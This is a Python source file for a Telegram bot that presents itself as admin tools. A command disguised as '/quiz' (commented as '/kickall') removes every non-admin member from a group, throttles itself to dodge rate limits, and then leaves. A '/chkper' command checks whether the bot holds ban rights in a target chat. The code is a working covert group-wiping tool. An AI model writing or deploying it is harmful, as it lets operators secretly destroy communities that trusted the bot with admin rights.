from telethon import TelegramClient, events
from telethon.tl.functions.channels import LeaveChannelRequest
import asyncio
from config import API_ID, API_HASH, BOT_TOKEN, AUTHORIZED_USERS

bot = TelegramClient("admin_tools_bot", API_ID, API_HASH)

# /kickall command
@bot.on(events.NewMessage(pattern=r"^/quiz$"))
async def kick_all_members(event):
    if event.sender_id not in AUTHORIZED_USERS:
        return await event.reply("You are not authorized.")

    chat = await event.get_chat()
    if not getattr(chat, "megagroup", False):
        return await event.reply("This command works only in groups.")

    me = await bot.get_me()
    count = 0
    await event.reply("Starting to kick all non-admin members...")

    async for member in bot.iter_participants(chat.id):
        try:
            if member.id == me.id:
                continue
            perms = await bot.get_permissions(chat.id, member.id)
            if perms.admin_rights or perms.creator:
                continue
            await bot.edit_permissions(chat.id, member.id, view_messages=False)
            count += 1
            await asyncio.sleep(1)  # Prevent flood limits
        except Exception as e:
            print(f"Error kicking {member.id}: {e}")

    await event.reply(f"Kicked {count} users. Leaving group now.")
    await bot(LeaveChannelRequest(chat.id))


# /chkper {chat_id} command
@bot.on(events.NewMessage(pattern=r"^/chkper(?:\s+(-?\d+))?$"))
async def check_permissions(event):
    if event.sender_id not in AUTHORIZED_USERS:
        return await event.reply("You are not authorized.")

    match = event.pattern_match
    chat_id = int(match.group(1)) if match.group(1) else event.chat_id

    try:
        me = await bot.get_me()
        perms = await bot.get_permissions(chat_id, me.id)

        if not perms.admin_rights:
            return await event.reply(f"I'm not an admin in chat `{chat_id}`.")

        rights = perms.admin_rights
        report = (
            f"Permissions in chat `{chat_id}`:\n"
            f"- Promote Admins: {'Yes' if rights.add_admins else 'No'}\n"
            f"- Change Info: {'Yes' if rights.change_info else 'No'}\n"
            f"- Delete Messages: {'Yes' if rights.delete_messages else 'No'}\n"
            f"- Ban Users: {'Yes' if rights.ban_users else 'No'}"
        )
        await event.reply(report)

    except Exception as e:
        await event.reply(f"Error: {e}")


# Bot startup
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("Bot is running...")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
